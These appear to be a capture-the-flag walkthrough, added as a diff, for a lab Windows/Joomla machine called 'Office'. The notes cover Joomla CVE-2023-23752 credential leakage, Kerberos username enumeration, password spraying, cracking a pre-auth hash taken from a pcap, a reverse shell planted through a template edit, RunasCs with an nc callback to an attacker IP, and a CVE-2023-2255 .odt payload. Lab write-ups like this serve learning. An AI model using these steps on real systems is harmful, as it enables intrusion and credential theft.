@@ -1,0 +1,64 @@
+nmap -p- IP
+nmap -A -p[ports] IP
+
+Check port 80, login in form, default creds dont work.
+
+Directory enum
+feroxbuster -u http://10.10.11.3 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
+
+nuclei -target http://10.10.11.3
+nikto -h http://10.10.11.3
+
+From directory enum we find joomla cms
+
+from nuclei we find CVE-2023-23752 adn accessing the endpoints that it provides we I’ve successfully obtained the username and password for the database. Let’s try using this password to log in to the page.
+
+It looks like the password didn’t work. Let’s try an AS-REP attack and utilize the Kerbrute tool to enumerate usernames.
+
+./kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+we get a list of usernames.
+Use crackmapexec with the password we found.
+
+crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares
+
+The enumerated user “dwolfe” can log in to SMB and directly access it using SMBClient.
+
+smbclient -U 'dwolfe' //10.10.11.3/'SOC Analysis'
+There’s a pcap file inside. Download it and open it with Wireshark to take a look.
+
+Scroll down, and you’ll notice that packets of the krb5 protocol have been sniffed, revealing the Kerberos protocol request. You can observe the hash type in the cipher. For more information, you can refer to this article: https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
+
+As per the article’s description, the hash type is krb5. In the header, “krb5” represents the hash type, “18” indicates the length of the hash. “tstark” is the username, visible in the data packet. “OFFICE.HTB” is the address at the end
+
+$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+
+hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt
+
+I cracked the password, and it is “playboy69.”
+
+Tried to log in with tstark but did not work, tried with administrator and we are in the cms.
+I changed the template of atum, specifically the error.php and accessed it at http://10.10.11.3/administrator/templates/atum/error.php
+
+Got reverse shell as web_account
+
+This shell cannot be used to get the user flag, but since we have `tstark` credentials, we can just move laterally to this user with `runascs`
+
+I upload RunasCs.exe and run
+.\RunasCs.exe tstark <password> cmd.exe -r 10.10.15.46:9999
+
+ rlwrap -cAr nc -lvp 9999
+
+i used this as when tried to use runas with a r1.exe from msfvenom i did not have permissions to run it. I dont know why.
+
+We check with netsta -ano and we find an port 8083
+We port forward with chisel
+
+there is an internal site in which we can upload resumes. after an failed resume we find the types which we can upload where one is odt.
+
+Using this https://github.com/elweth-sec/CVE-2023-2255
+we create a test.exe and upload it at the public user folder. then we upload the resume succesfully, open a listener and wait for connection from user Ppotts.
+
+Another way is to serach inside the c:\xampp\htdocs\ with the web_account user, tstart does not have permissions, and read the source code of resume php. Then we can uppload the .odt file at c:\xampp\htdocs\internal\applications where the applications go.
+
+
